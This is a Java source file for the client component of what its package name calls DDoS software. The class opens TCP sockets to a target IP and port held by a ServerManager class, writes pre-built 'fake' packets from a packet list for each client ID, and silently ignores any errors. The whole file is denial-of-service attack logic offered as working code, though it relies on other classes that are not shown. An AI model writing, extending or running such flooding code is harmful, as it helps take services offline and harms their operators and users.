package src.Main.DDosSoftware.DDosLogic.Client;

import java.io.IOException;
import java.io.OutputStream;
import java.net.Socket;
import java.net.UnknownHostException;

import src.Main.DDosSoftware.DDosLogic.Server.ServerManager;

public class Client {
    private Socket socket;
    private OutputStream os;

    private int clientID;

    public Socket getSocket() {
        return this.socket;
    }

    /**
     * Connect to the server by sending fake Packets
     * 
     */
    public void connect() {
        try {
            socket = new Socket(ServerManager.getIp(), ServerManager.getPort());
        } catch (UnknownHostException e) {
            System.out.println("Unknown Host");
            return;
        } catch (IOException e) {
            return;
        }
        try {
            os = socket.getOutputStream();
            os.write(ClientPacketManager.packetList.get(clientID));
        } catch (Exception e) {

        }
        System.out.println(socket.getLocalPort() + "'s connection is established!");
        return;
    }

    public Client(int id) {
        this.clientID = id;
    }

}
